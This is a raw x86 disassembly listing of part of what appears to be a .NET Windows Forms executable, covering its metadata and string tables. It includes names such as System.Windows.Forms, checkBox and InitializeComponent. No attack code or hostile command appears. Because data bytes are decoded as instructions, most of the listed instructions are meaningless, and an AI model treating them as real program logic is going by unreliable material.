  402d4a:	adc    BYTE PTR [eax],al
  402d4c:	xchg   edi,eax
  402d4d:	add    eax,0x41076a
  402d52:	add    DWORD PTR [eax],eax
  402d54:	add    DWORD PTR [eax],eax
  402d56:	add    BYTE PTR [ecx],0x10
  402d59:	add    BYTE PTR [ebp+eax*1+0x6a],ah
  402d5d:	pop    es
  402d5e:	push   ebp
  402d5f:	add    BYTE PTR [eax],cl
  402d61:	add    BYTE PTR [ebx],cl
  402d63:	add    BYTE PTR [ecx],al
  402d65:	add    BYTE PTR [eax],dl
  402d67:	add    BYTE PTR [edx+0x7],bl
  402d6a:	push   0x7
  402d6c:	push   ebp
  402d6d:	add    BYTE PTR [eax],cl
  402d6f:	add    BYTE PTR [eax+eax*1],cl
  402d72:	add    BYTE PTR [eax],al
  402d74:	adc    BYTE PTR [eax],al
  402d76:	or     al,0x8
  402d78:	or     BYTE PTR gs:[ebp+0x0],dl
  402d7c:	or     al,BYTE PTR [eax]
  402d7e:	adc    DWORD PTR [eax],eax
  402d80:	add    BYTE PTR [ecx],al
  402d82:	adc    BYTE PTR [eax],al
  402d84:	xlat   BYTE PTR ds:[ebx]
  402d85:	or     BYTE PTR [ebp+0x8],ah
  402d88:	xchg   ebp,eax
  402d89:	add    BYTE PTR [eax+eax*1],cl
  402d8c:	adc    eax,0x10000300
  402d91:	add    BYTE PTR [ecx+0x1],dh
  402d94:	add    BYTE PTR [eax],al
  402d96:	push   ebp
  402d97:	add    BYTE PTR ds:0x1001800,cl
  402d9d:	add    BYTE PTR [esi],bh
  402d9f:	or     DWORD PTR [edi+0x8000101],ebx
  402da5:	add    BYTE PTR [ebx-0x32fffeff],ah
  402dab:	or     BYTE PTR [edi+0x64000101],ah
  402db1:	pop    es
  402db2:	stos   DWORD PTR es:[edi],eax
  402db3:	add    DWORD PTR [ecx],eax
  402db5:	add    BYTE PTR ds:0x101ab02,bh
  402dbb:	add    BYTE PTR [edi+0x8],dh
  402dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dbf:	add    DWORD PTR [ecx],eax
  402dc1:	add    BYTE PTR [eax+0x101a708],ch
  402dc7:	add    bh,al
  402dc9:	push   es
  402dca:	scas   eax,DWORD PTR es:[edi]
  402dcb:	add    DWORD PTR [ecx],eax
  402dcd:	add    ah,ah
  402dcf:	or     DWORD PTR [ebx+0x78001101],esi
  402dd5:	add    eax,0x1101b7
  402dda:	or     al,BYTE PTR [edx]
  402ddc:	mov    esp,0x4f001101
  402de1:	add    ecx,eax
  402de3:	add    DWORD PTR [esi],eax
  402de5:	add    bl,cl
  402de7:	or     DWORD PTR [ebx-0x1ffff9ff],esi
  402ded:	add    ebp,eax
  402def:	add    DWORD PTR [esi],eax
  402df1:	add    BYTE PTR [esi+0x4],bl
  402df4:	lds    eax,FWORD PTR [ecx]
  402df6:	push   es
  402df7:	add    BYTE PTR [esi+0x5001c805],cl
  402dfd:	and    BYTE PTR [eax],al
  402dff:	add    BYTE PTR [eax],al
  402e01:	add    BYTE PTR [esi+0x607a618],al
  402e07:	add    BYTE PTR [ecx],al
  402e09:	add    BYTE PTR [esi+0x20],bl
  402e0c:	add    BYTE PTR [eax],al
  402e0e:	add    BYTE PTR [eax],al
  402e10:	add    DWORD PTR [eax],0x1d004f4
  402e16:	add    DWORD PTR [eax],eax
  402e18:	push   0x20
  402e1d:	add    BYTE PTR [ecx+0x6065e00],al
  402e23:	add    BYTE PTR [ebx],al
  402e25:	add    BYTE PTR [ebp+0x20],ch
  402e2b:	add    BYTE PTR [ecx-0x2fff2800],al
  402e31:	add    DWORD PTR [ebx],eax
  402e33:	add    BYTE PTR [ebp+0x20],ch
  402e39:	add    BYTE PTR [ecx-0x2fff6e00],al
  402e3f:	add    DWORD PTR ds:0x20ad00,eax
  402e45:	add    BYTE PTR [eax],al
  402e47:	add    BYTE PTR [ecx-0x2fff4e00],al
  402e4d:	add    DWORD PTR [edi],eax
  402e4f:	add    BYTE PTR [ebp+0x20],dh
  402e55:	add    BYTE PTR [ecx-0x2fff9300],al
  402e5b:	add    DWORD PTR [ecx],ecx
  402e5d:	add    ah,ah
  402e5f:	and    BYTE PTR [eax],al
  402e61:	add    BYTE PTR [eax],al
  402e63:	add    BYTE PTR [ecx-0x2ffafa00],al
  402e69:	add    DWORD PTR [ebx],ecx
  402e6b:	add    BYTE PTR [edx+eiz*1],bl
  402e6e:	add    BYTE PTR [eax],al
  402e70:	add    BYTE PTR [eax],al
  402e72:	les    eax,FWORD PTR [eax]
  402e74:	dec    ecx
  402e75:	add    dl,BYTE PTR ds:0x3c000d00
  402e7b:	and    al,BYTE PTR [eax]
  402e7d:	add    BYTE PTR [eax],al
  402e7f:	add    BYTE PTR [ecx+0x609b700],al
  402e85:	add    BYTE PTR [esi],cl
  402e87:	add    BYTE PTR [esi],bl
  402e89:	daa    
  402e8a:	add    BYTE PTR [eax],al
  402e8c:	add    BYTE PTR [eax],al
  402e8e:	xchg   ecx,eax
  402e8f:	add    BYTE PTR [ebx+0xe002705],bl
  402e95:	add    BYTE PTR [eax],bh
  402e97:	daa    
  402e98:	add    BYTE PTR [eax],al
  402e9a:	add    BYTE PTR [eax],al
  402e9c:	xchg   BYTE PTR [eax],bl
  402e9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e9f:	pop    es
  402ea0:	adc    BYTE PTR [eax],al
  402ea2:	push   cs
  402ea3:	add    BYTE PTR [eax+ebp*1+0x0],bh
  402ea7:	add    BYTE PTR [eax],al
  402ea9:	add    BYTE PTR [ecx-0x7dfa7c00],al
  402eaf:	add    BYTE PTR [edi],cl
  402eb1:	add    BYTE PTR [edi],ah
  402eb3:	sub    DWORD PTR [eax],eax
  402eb5:	add    BYTE PTR [eax],al
  402eb7:	add    BYTE PTR [ecx-0x28febe00],al
  402ebd:	add    DWORD PTR [edi],ecx
  402ebf:	add    BYTE PTR [eax+0x29],al
  402ec2:	add    BYTE PTR [eax],al
  402ec4:	add    BYTE PTR [eax],al
  402ec6:	add    DWORD PTR [eax],0x60133
  402ecc:	adc    BYTE PTR [eax],al
  402ece:	je     0x402ef9
  402ed0:	add    BYTE PTR [eax],al
  402ed2:	add    BYTE PTR [eax],al
  402ed4:	xchg   BYTE PTR [eax],al
  402ed6:	push   ebp
  402ed7:	add    al,0xdc
  402ed9:	add    DWORD PTR [eax],edx
  402edb:	add    BYTE PTR [edx+ebp*1+0x0],al
  402edf:	add    BYTE PTR [eax],al
  402ee1:	add    BYTE PTR [ebx+0x607a618],al
  402ee7:	add    BYTE PTR [edx],dl
  402ee9:	add    BYTE PTR [edx+ebp*1+0x0],cl
  402eed:	add    BYTE PTR [eax],al
  402eef:	add    BYTE PTR [ebx-0x1cf90ef8],dl
  402ef5:	add    DWORD PTR [edx],edx
  402ef7:	add    BYTE PTR [eax+0x2a],bh
  402efa:	add    BYTE PTR [eax],al
  402efc:	add    BYTE PTR [eax],al
  402efe:	xchg   ebx,eax
  402eff:	or     dl,dh
  402f01:	add    ecx,ebp
  402f03:	add    DWORD PTR [edx],edx
  402f05:	add    BYTE PTR [edi+0x2a],bh
  402f08:	add    BYTE PTR [eax],al
  402f0a:	add    BYTE PTR [eax],al
  402f0c:	xchg   ebx,eax
  402f0d:	or     dh,bh
  402f0f:	add    edi,ebp
  402f11:	add    DWORD PTR [edx],edx
  402f13:	add    BYTE PTR [edi+0x2a],al
  402f19:	add    BYTE PTR [esi-0x9f693f8],dl
  402f1f:	add    DWORD PTR [ebx],edx
  402f21:	add    BYTE PTR [esi+0x2a],cl
  402f27:	add    BYTE PTR [esi+0x607a618],al
  402f2d:	add    BYTE PTR [ebx],dl
  402f2f:	add    BYTE PTR [esi+0x2a],dl
  402f35:	add    BYTE PTR [ecx+0x2707ac18],dl
  402f3b:	add    BYTE PTR [ebx],dl
  402f3d:	add    BYTE PTR [edx+ebp*1+0x0],al
  402f41:	add    BYTE PTR [eax],al
  402f43:	add    BYTE PTR [esi+0x607a618],al
  402f49:	add    BYTE PTR [ebx],dl
  402f4b:	add    BYTE PTR [eax],al
  402f4d:	add    BYTE PTR [ecx],al
  402f4f:	add    dl,ch
  402f51:	push   es
  402f52:	add    BYTE PTR [eax],al
  402f54:	add    al,BYTE PTR [eax]
  402f56:	xchg   edx,eax
  402f57:	add    al,0x0
  402f59:	add    BYTE PTR [ecx],al
  402f5b:	add    dl,ch
  402f5d:	push   es
  402f5e:	add    BYTE PTR [eax],al
  402f60:	add    al,BYTE PTR [eax]
  402f62:	xchg   edx,eax
  402f63:	add    al,0x0
  402f65:	add    BYTE PTR [ecx],al
  402f67:	add    dl,ch
  402f69:	push   es
  402f6a:	add    BYTE PTR [eax],al
  402f6c:	add    al,BYTE PTR [eax]
  402f6e:	xchg   edx,eax
  402f6f:	add    al,0x0
  402f71:	add    BYTE PTR [ecx],al
  402f73:	add    dl,ch
  402f75:	push   es
  402f76:	add    BYTE PTR [eax],al
  402f78:	add    al,BYTE PTR [eax]
  402f7a:	xchg   edx,eax
  402f7b:	add    al,0x0
  402f7d:	add    BYTE PTR [ecx],al
  402f7f:	add    dl,ch
  402f81:	push   es
  402f82:	add    BYTE PTR [eax],al
  402f84:	add    al,BYTE PTR [eax]
  402f86:	xchg   edx,eax
  402f87:	add    al,0x0
  402f89:	add    BYTE PTR [ecx],al
  402f8b:	add    dl,ch
  402f8d:	push   es
  402f8e:	add    BYTE PTR [eax],al
  402f90:	add    al,BYTE PTR [eax]
  402f92:	xchg   edx,eax
  402f93:	add    al,0x0
  402f95:	add    BYTE PTR [ecx],al
  402f97:	add    BYTE PTR [edi+0x1000004],dh
  402f9d:	add    bl,dl
  402f9f:	add    al,0x0
  402fa1:	add    BYTE PTR [ecx],al
  402fa3:	add    al,dl
  402fa5:	add    al,0x0
  402fa7:	add    BYTE PTR [ecx],al
  402fa9:	add    BYTE PTR [eax+0x200020a],ah
  402faf:	add    BYTE PTR [esi+0x4],bl
  402fb2:	add    BYTE PTR [eax],al
  402fb4:	add    DWORD PTR [eax],eax
  402fb6:	pop    esi
  402fb7:	add    al,0x9
  402fb9:	add    BYTE PTR [esi+0x11000107],ah
  402fbf:	add    BYTE PTR [esi+0x19000607],ah
  402fc5:	add    BYTE PTR [esi+0x29000a07],ah
  402fcb:	add    BYTE PTR [esi+0x31001007],ah
  402fd1:	add    BYTE PTR [esi+0x39001007],ah
  402fd7:	add    BYTE PTR [esi+0x41001007],ah
  402fdd:	add    BYTE PTR [esi+0x49001007],ah
  402fe3:	add    BYTE PTR [esi+0x51001007],ah
  402fe9:	add    BYTE PTR [esi+0x59001007],ah
  402fef:	add    BYTE PTR [esi+0x61001007],ah
  402ff5:	add    BYTE PTR [esi+0x69001507],ah
  402ffb:	add    BYTE PTR [esi+0x71001007],ah
  403001:	add    BYTE PTR [esi+0x79001007],ah
  403007:	add    BYTE PTR [esi-0x2effeff9],ah
  40300d:	add    BYTE PTR [esi-0xefff9f9],ah
  403013:	add    BYTE PTR [esi-0x6ffe5f9],ah
  403019:	add    BYTE PTR [esi+0x1000607],ah
  40301f:	add    DWORD PTR [esi+0x21000607],esp
  403025:	add    DWORD PTR [esi-0x7effdff9],esp
  40302b:	add    BYTE PTR [esi+0x31000607],ah
  403031:	add    DWORD PTR [edi+0x9],esp
  403034:	daa    
  403035:	add    BYTE PTR [ecx+0x2f00fa00],bl
  40303b:	add    BYTE PTR [ecx],bh
  40303d:	add    DWORD PTR [edx],edx
  40303f:	add    DWORD PTR ds:0x49014100,edx
  403045:	or     DWORD PTR [ebx],esi
  403047:	add    BYTE PTR [ecx],bh
  403049:	add    DWORD PTR [esi+0x51001501],ecx
  40304f:	add    esp,ebx
  403051:	add    al,0x43
  403053:	add    BYTE PTR [ecx+0x1],ah
  403056:	in     eax,0x1
  403058:	dec    edx
  403059:	add    BYTE PTR [ecx+0x1],ch
  40305c:	mov    cl,0xa
  40305e:	push   eax
  40305f:	add    BYTE PTR [ecx+0x1],al
  403062:	mov    edi,0x79005708
  403067:	add    DWORD PTR [edx],edi
  403069:	or     bl,BYTE PTR [esi+0x0]
  40306c:	cmp    DWORD PTR [ecx],eax
  40306e:	add    BYTE PTR [ecx],0x2f
  403071:	add    BYTE PTR [ecx+0x6c09ed01],bl
  403077:	add    BYTE PTR [ecx+0x73074e01],ah
  40307d:	add    BYTE PTR [ecx+0x770a8900],bh
  403083:	add    BYTE PTR [ecx+0x7d045500],bh
  403089:	add    BYTE PTR [ecx-0x7dfb5200],ch
  40308f:	add    BYTE PTR [ecx+0x1],cl
  403092:	push   eax
  403093:	or     DWORD PTR [edx+0x0],ecx
  403096:	test   eax,0x6024901
  40309b:	add    BYTE PTR [ecx+0x15024900],al
  4030a1:	add    BYTE PTR [ecx-0x74fe53ff],dh
  4030a7:	add    cl,cl
  4030a9:	add    BYTE PTR [esi-0x6eff6bf9],ah
  4030af:	add    BYTE PTR [esi-0x66fff9f9],ah
  4030b5:	add    BYTE PTR [esi-0x5efff9f9],ah
  4030bb:	add    BYTE PTR [esi+0x39000607],ah
  4030c1:	add    ebx,esi
  4030c3:	or     DWORD PTR [esi],eax
  4030c5:	add    BYTE PTR [ecx],bh
  4030c7:	add    edx,ebp
  4030c9:	or     BYTE PTR [ebx+0x7b01c100],bl
  4030cf:	add    BYTE PTR [ecx-0x59fe3700],ah
  4030d5:	pop    es
  4030d6:	test   al,0x0
  4030d8:	cmp    DWORD PTR [ecx],eax
  4030da:	les    eax,FWORD PTR ds:0x13900ae
  4030e0:	xlat   BYTE PTR ds:[ebx]
  4030e1:	add    DWORD PTR [eax],edx
  4030e3:	add    cl,dl
  4030e5:	add    DWORD PTR [esi+0x3900a807],esp
  4030eb:	add    DWORD PTR [edi+0x4],ebp
  4030ee:	mov    ch,0x0
  4030f0:	cmp    DWORD PTR [ecx],eax
  4030f2:	aas    
  4030f3:	or     al,BYTE PTR [ecx]
  4030f5:	add    BYTE PTR [ecx+0x15069e00],dl
  4030fb:	add    BYTE PTR [ecx],bh
  4030fd:	add    DWORD PTR [ecx],esi
  4030ff:	or     dl,BYTE PTR [eax]
  403101:	add    BYTE PTR [ecx],bh
  403103:	add    DWORD PTR [eax+0x4],edi
  403106:	adc    eax,0x7c01d900
  40310b:	pop    es
  40310c:	adc    eax,0xa601e100
  403111:	pop    es
  403112:	mov    esp,0x7f009900
  403117:	add    dl,al
  403119:	add    BYTE PTR [ecx+0x15010600],bl
  40311f:	add    BYTE PTR [ecx-0x36fd9a00],bl
  403125:	add    BYTE PTR [ecx],bh
  403127:	add    DWORD PTR [ecx+0x7],esi
  40312a:	rol    BYTE PTR [eax],1
  40312c:	cmp    DWORD PTR [ecx],eax
  40312e:	jmp    0x9a00:0xa100c204
  403135:	or     edi,edx
  403137:	add    BYTE PTR [ecx-0x21f99100],al
  40313d:	add    BYTE PTR [ecx],al
  40313f:	add    ah,BYTE PTR [esi+0x900e507]
  403145:	add    cl,BYTE PTR [ecx+ecx*1]
  403148:	jmp    0x40314a
  40314a:	or     DWORD PTR [edx],eax
  40314c:	pop    edi
  40314d:	add    edx,esi
  40314f:	add    BYTE PTR [ecx-0x21f9b300],al
  403155:	add    BYTE PTR [ecx-0x4afb7b00],al
  40315b:	add    BYTE PTR [ecx-0x6fe3d00],al
  403161:	add    BYTE PTR [ecx],cl
  403163:	add    DWORD PTR [edi+0x9],edx
  403166:	jge    0x403168
  403168:	add    DWORD PTR [eax],0x10005a0
  40316e:	add    DWORD PTR [eax],0x150a67
  403174:	add    DWORD PTR [eax],0x150a57
  40317a:	add    DWORD PTR [eax],0x107061f
  403180:	add    DWORD PTR [eax],0xc20064
  403186:	cmp    DWORD PTR [ecx],eax
  403188:	add    DWORD PTR [edx],ecx
  40318a:	adc    eax,0xe013900
  40318f:	or     al,BYTE PTR [esi]
  403191:	add    BYTE PTR [ecx],dh
  403193:	add    DWORD PTR [eax+0x31002708],ecx
  403199:	add    DWORD PTR [eax+0x9],edi
  40319c:	push   cs
  40319d:	add    DWORD PTR [ecx],esi
  40319f:	add    DWORD PTR [eax-0x56feecfa],eax
  4031a5:	add    BYTE PTR [esi+0x31000607],ah
  4031ab:	add    ah,BYTE PTR [esi-0x26fff9f9]
  4031b1:	add    BYTE PTR [esi+0xc001007],ah
  4031b7:	add    BYTE PTR [esi+0xc000607],ah
  4031bd:	add    BYTE PTR [ebx+0x0],bh
  4031c0:	sub    al,BYTE PTR [ecx]
  4031c2:	dec    ecx
  4031c3:	add    edx,ecx
  4031c5:	or     dh,BYTE PTR [eax]
  4031c7:	add    ecx,ebx
  4031c9:	add    BYTE PTR [ebp+eax*1+0x2f],dl
  4031cd:	add    BYTE PTR [ecx],bh
  4031cf:	add    bl,BYTE PTR [ecx]
  4031d1:	add    eax,0x239013d
  4031d6:	pop    edi
  4031d7:	add    BYTE PTR ds:0xe9014901,bh
  4031dd:	or     DWORD PTR [ecx+0x1],eax
  4031e0:	dec    ecx
  4031e1:	add    DWORD PTR [ebx],ebp
  4031e3:	add    DWORD PTR [ecx+0x1],eax
  4031e6:	dec    ecx
  4031e7:	add    DWORD PTR [ecx+0x9],esp
  4031ea:	pop    edx
  4031eb:	add    DWORD PTR [eax+eax*1],ecx
  4031ee:	cwde   
  4031ef:	pop    es
  4031f0:	popa   
  4031f1:	add    DWORD PTR [eax+eax*1],edx
  4031f4:	ror    BYTE PTR [ecx],cl
  4031f6:	jno    0x4031f9
  4031f8:	adc    al,0x0
  4031fa:	sbb    al,0xa
  4031fc:	das    
  4031fd:	add    BYTE PTR [ecx+0x760aa401],dh
  403203:	add    DWORD PTR [ecx],ecx
  403205:	add    DWORD PTR [esi+0x29017c07],esp
  40320b:	add    DWORD PTR [esi+0x51000607],esp
  403211:	add    bl,BYTE PTR [esi]
  403213:	add    DWORD PTR [ecx+eax*1+0x9b0029],eax
  40321a:	xor    al,0x2
  40321c:	add    BYTE PTR cs:[ebx],cl
  40321f:	add    BYTE PTR [edx+eax*1],cl
  403222:	add    BYTE PTR cs:[ebx],dl
  403225:	add    BYTE PTR ds:0x1b002e02,dl
  40322b:	add    BYTE PTR [edx+eax*1],dh
  40322e:	add    BYTE PTR cs:[ebx],ah
  403231:	add    BYTE PTR ds:0x2b002e02,bh
  403237:	add    BYTE PTR [eax+0x2],bl
  40323a:	add    BYTE PTR cs:[ebx],dh
  40323d:	add    BYTE PTR [eax+0x2],bl
  403240:	add    BYTE PTR cs:[ebx],bh
  403243:	add    BYTE PTR [esi+0x2],bl
  403246:	add    BYTE PTR cs:[ebx+0x0],al
  40324a:	ja     0x40324e
  40324c:	add    BYTE PTR cs:[ebx+0x0],cl
  403250:	add    DWORD PTR [edx],0x2e
  403253:	add    BYTE PTR [ebx+0x0],dl
  403256:	pop    eax
  403257:	add    ch,BYTE PTR [esi]
  403259:	add    BYTE PTR [ebx+0x0],bl
  40325c:	pop    eax
  40325d:	add    ch,BYTE PTR [esi]
  40325f:	add    BYTE PTR [ebx+0x0],ah
  403262:	cdq    
  403263:	add    ch,BYTE PTR [esi]
  403265:	add    BYTE PTR [ebx+0x0],ch
  403268:	ret    
  403269:	add    ch,BYTE PTR [esi]
  40326b:	add    BYTE PTR [ebx+0x0],dh
  40326e:	rol    BYTE PTR [edx],1
  403270:	dec    ecx
  403271:	add    BYTE PTR [ebx-0x5cfdcc00],bl
  403277:	add    BYTE PTR [ebx-0x5cfcc500],al
  40327d:	add    BYTE PTR [ebx-0x5cfcca00],cl
  403283:	add    BYTE PTR [ebx-0x3cfcca00],dl
  403289:	add    BYTE PTR [ebx-0x3cfcca00],dl
  40328f:	add    BYTE PTR [ebx+0x60037c00],al
  403295:	add    DWORD PTR [ebx+0x0],edi
  403298:	add    ebp,DWORD PTR ss:[ebx]
  40329b:	add    BYTE PTR [eax],bh
  40329d:	add    BYTE PTR [esi+0x36011900],al
  4032a3:	add    DWORD PTR [edi+0x1],eax
  4032a6:	add    eax,0x6000100
  4032ab:	add    BYTE PTR [ebx],al
  4032ad:	add    BYTE PTR [eax],al
  4032af:	add    BYTE PTR [esi],cl
  4032b1:	pop    es
  4032b2:	sti    
  4032b3:	add    DWORD PTR [eax],eax
  4032b5:	add    BYTE PTR [edx],dl
  4032b7:	add    al,BYTE PTR [ecx]
  4032b9:	add    al,BYTE PTR [eax]
  4032bb:	add    BYTE PTR [edx+0x2020709],dl
  4032c1:	add    BYTE PTR [edx],dl
  4032c3:	add    BYTE PTR [ebx],al
  4032c5:	add    BYTE PTR [edx],al
  4032c7:	add    BYTE PTR [ebx],dl
  4032c9:	add    BYTE PTR ds:0x14000100,al
  4032cf:	add    BYTE PTR ds:0x15000200,al
  4032d5:	add    BYTE PTR [edi],al
  4032d7:	add    BYTE PTR [ebx],ah
  4032d9:	add    DWORD PTR [edx+0x1],ebp
  4032dc:	add    al,0x80
  4032de:	add    BYTE PTR [eax],al
  4032e0:	add    DWORD PTR [eax],eax
	...
  4032ee:	push   0x7
  4032f0:	add    BYTE PTR [eax],al
  4032f2:	add    al,0x0
	...
  4032fc:	add    BYTE PTR [eax],al
  4032fe:	lea    eax,[ecx]
  403300:	cmp    eax,DWORD PTR [eax]
  403302:	add    BYTE PTR [eax],al
  403304:	add    BYTE PTR [eax],al
  403306:	add    al,0x0
	...
  403310:	add    BYTE PTR [eax],al
  403312:	lea    eax,[ecx]
  403314:	test   DWORD PTR [eax],0x0
  40331a:	add    al,0x0
	...
  403324:	add    BYTE PTR [eax],al
  403326:	lea    eax,[ecx]
  403328:	ins    BYTE PTR es:[edi],dx
  403329:	add    eax,0x0
  40332e:	add    al,0x0
	...
  403338:	add    BYTE PTR [eax],al
  40333a:	xchg   esi,eax
  40333b:	add    ecx,eax
  40333d:	add    al,0x0
  40333f:	add    BYTE PTR [eax],al
  403341:	add    BYTE PTR [eax],al
  403343:	add    BYTE PTR [eax],al
  403345:	add    BYTE PTR [ecx],al
  403347:	add    BYTE PTR [eax],al
  403349:	add    BYTE PTR [esi],dl
  40334b:	or     BYTE PTR [eax],al
  40334d:	add    BYTE PTR [eax+0x10004c0],ch
  403353:	add    BYTE PTR [eax],al
  403355:	add    BYTE PTR [eax],dh
  403357:	or     BYTE PTR [eax],al
  403359:	add    BYTE PTR [edi],al
  40335b:	add    BYTE PTR [eax+eax*1],al
  40335e:	add    BYTE PTR [eax],al
  403360:	add    BYTE PTR [ecx+ebp*2+0x73],cl
  403364:	je     0x4033c6
  403366:	xor    DWORD PTR [eax],eax
  403368:	addr16 jb 0x4033da
  40336b:	jne    0x4033dd
  40336d:	inc    edx
  40336e:	outs   dx,DWORD PTR ds:[esi]
  40336f:	js     0x4033a2
  403371:	add    BYTE PTR [ebp+0x69],cl
  403374:	arpl   WORD PTR [edx+0x6f],si
  403377:	jae    0x4033e8
  403379:	data16 je 0x4033aa
  40337c:	push   edi
  40337d:	imul   ebp,DWORD PTR [esi+0x33],0x4d3c0032
  403384:	outs   dx,DWORD PTR ds:[esi]
  403385:	fs jne 0x4033f4
  403388:	gs add BYTE PTR ds:[ebx+0x69],dl
  40338d:	jp     0x4033f4
  40338f:	inc    esi
  403390:	add    BYTE PTR [ebx+0x79],dl
  403393:	jae    0x403409
  403395:	gs ins DWORD PTR es:[edi],dx
  403397:	cs dec ecx
  403399:	dec    edi
  40339a:	add    BYTE PTR [ebp+0x73],ch
  40339d:	arpl   WORD PTR [edi+0x72],bp
  4033a0:	ins    BYTE PTR es:[edi],dx
  4033a1:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  4033a8:	gs ins DWORD PTR es:[edi],dx
  4033aa:	cs inc ebx
  4033ac:	outs   dx,DWORD PTR ds:[esi]
  4033ad:	ins    BYTE PTR es:[edi],dx
  4033ae:	ins    BYTE PTR es:[edi],dx
  4033af:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4033b4:	outs   dx,BYTE PTR ds:[esi]
  4033b5:	jae    0x4033e5
  4033b7:	inc    edi
  4033b8:	outs   dx,BYTE PTR gs:[esi]
  4033ba:	gs jb  0x403426
  4033bd:	arpl   WORD PTR [eax],ax
  4033bf:	push   edx
  4033c0:	gs popa 
  4033c2:	add    BYTE PTR fs:[ecx+0x64],ah
  4033c6:	fs pop edi
  4033c8:	dec    esp
  4033c9:	outs   dx,DWORD PTR ds:[esi]
  4033ca:	popa   
  4033cb:	add    BYTE PTR fs:[esi+0x6f],al
  4033cf:	jb     0x40343e
  4033d1:	dec    ebp
  4033d2:	popa   
  4033d3:	imul   ebp,DWORD PTR [esi+0x5f],0x64616f4c
  4033da:	add    BYTE PTR [ecx+0x64],al
  4033dd:	add    BYTE PTR fs:[ecx+0x64],ah
  4033e1:	fs pop edi
  4033e3:	inc    ebx
  4033e4:	push   0x656b6365
  4033e9:	fs inc ebx
  4033eb:	push   0x65676e61
  4033f0:	add    BYTE PTR fs:[ebx+0x68],ah
  4033f4:	arpl   WORD PTR gs:[ebx+0x56],bp
  4033f8:	gs jb  0x403464
  4033fb:	data16 jns 0x403444
  4033fe:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x6568435f
  403406:	arpl   WORD PTR [ebx+0x65],bp
  403409:	fs inc ebx
  40340b:	push   0x65676e61
  403410:	add    BYTE PTR fs:[ebx+0x68],ah
  403414:	arpl   WORD PTR gs:[ebx+0x52],bp
  403418:	imul   ebp,DWORD PTR gs:[esi+0x73],0x6c6c6174
  403420:	push   edx
  403421:	jne    0x403491
  403423:	je     0x40348e
  403425:	ins    DWORD PTR es:[edi],dx
  403426:	gs jae 0x403488
  403429:	inc    ebx
  40342a:	push   0x656b6365
  40342f:	fs inc ebx
  403431:	push   0x65676e61
  403436:	add    BYTE PTR fs:[ebx+0x68],ah
  40343a:	arpl   WORD PTR gs:[ebx+0x52],bp
  40343e:	gs jae 0x4034a6
  403441:	je     0x403496
  403443:	gs je  0x4034ba
  403446:	imul   ebp,DWORD PTR [esi+0x67],0x68435f73
  40344d:	arpl   WORD PTR gs:[ebx+0x65],bp
  403451:	fs inc ebx
  403453:	push   0x65676e61
  403458:	add    BYTE PTR fs:[edi+0x65],ah
  40345c:	je     0x4034bd
  40345e:	inc    ebx
  40345f:	push   0x656b6365
  403464:	add    BYTE PTR fs:[ebx+0x65],dh
  403468:	je     0x4034c9
  40346a:	inc    ebx
  40346b:	push   0x656b6365
  403470:	add    BYTE PTR fs:[ebx+0x65],dh
  403474:	je     0x4034d5
  403476:	inc    ebp
  403477:	outs   dx,BYTE PTR ds:[esi]
  403478:	popa   
  403479:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  40347d:	add    BYTE PTR [ebx+0x79],dl
  403480:	outs   dx,BYTE PTR ds:[esi]
  403481:	arpl   WORD PTR [eax+0x72],bp
  403484:	outs   dx,DWORD PTR ds:[esi]
  403485:	outs   dx,BYTE PTR ds:[esi]
  403486:	imul   edi,DWORD PTR [edx+0x65],0x72540064
  40348d:	imul   ebp,DWORD PTR [ebp+0x45],0x5300646e
  403494:	imul   ebp,DWORD PTR [ecx+0x70],0x57
  403498:	push   0x73657469
  40349d:	jo     0x403500
  40349f:	arpl   WORD PTR [ebp+0x0],sp
  4034a2:	dec    ecx
  4034a3:	jae    0x4034fc
  4034a5:	push   0x73657469
  4034aa:	jo     0x40350d
  4034ac:	arpl   WORD PTR [ebp+0x0],sp
  4034af:	fs gs popaw 
  4034b3:	jne    0x403521
  4034b5:	je     0x403500
  4034b7:	outs   dx,BYTE PTR ds:[esi]
  4034b8:	jae    0x40352e
  4034ba:	popa   
  4034bb:	outs   dx,BYTE PTR ds:[esi]
  4034bc:	arpl   WORD PTR [ebp+0x0],sp
  4034bf:	jae    0x403526
  4034c1:	je     0x403522
  4034c3:	inc    ecx
  4034c4:	jne    0x40353a
  4034c6:	outs   dx,DWORD PTR ds:[esi]
  4034c7:	push   ebx
  4034c8:	arpl   WORD PTR [ecx+0x6c],sp
  4034cb:	gs dec ebp
  4034cd:	outs   dx,DWORD PTR ds:[esi]
  4034ce:	fs add BYTE PTR gs:[esi+0x6f],cl
  4034d3:	fs add BYTE PTR gs:[ecx+0x44],cl
  4034d8:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  4034df:	ins    BYTE PTR es:[edi],dx
  4034e0:	add    BYTE PTR gs:[edi+0x65],ah
  4034e4:	je     0x403545
  4034e6:	push   esi
  4034e7:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  4034ee:	jae    0x403555
  4034f0:	je     0x403551
  4034f2:	push   esi
  4034f3:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  4034fa:	push   edx
  4034fb:	jne    0x40356b
  4034fd:	je     0x403568
  4034ff:	ins    DWORD PTR es:[edi],dx
  403500:	gs push esp
  403502:	jns    0x403574
  403504:	gs dec eax
  403506:	popa   
  403507:	outs   dx,BYTE PTR ds:[esi]
  403508:	fs ins BYTE PTR es:[edi],dx
  40350a:	add    BYTE PTR gs:[edi+0x65],al
  40350e:	je     0x403564
  403510:	jns    0x403582
  403512:	gs inc esi
  403514:	jb     0x403585
  403516:	ins    DWORD PTR es:[edi],dx
  403517:	dec    eax
  403518:	popa   
  403519:	outs   dx,BYTE PTR ds:[esi]
  40351a:	fs ins BYTE PTR es:[edi],dx
  40351c:	add    BYTE PTR gs:[esi+0x69],al
  403520:	ins    BYTE PTR es:[edi],dx
  403521:	add    BYTE PTR gs:[ebx+0x65],dh
  403525:	je     0x403586
  403527:	inc    esi
  403528:	outs   dx,DWORD PTR ds:[esi]
  403529:	jb     0x403598
  40352b:	inc    edx
  40352c:	outs   dx,DWORD PTR ds:[esi]
  40352d:	jb     0x403593
  40352f:	gs jb  0x403585
  403532:	je     0x4035ad
  403534:	ins    BYTE PTR es:[edi],dx
  403535:	add    BYTE PTR gs:[ebx+0x65],dh
  403539:	je     0x40359a
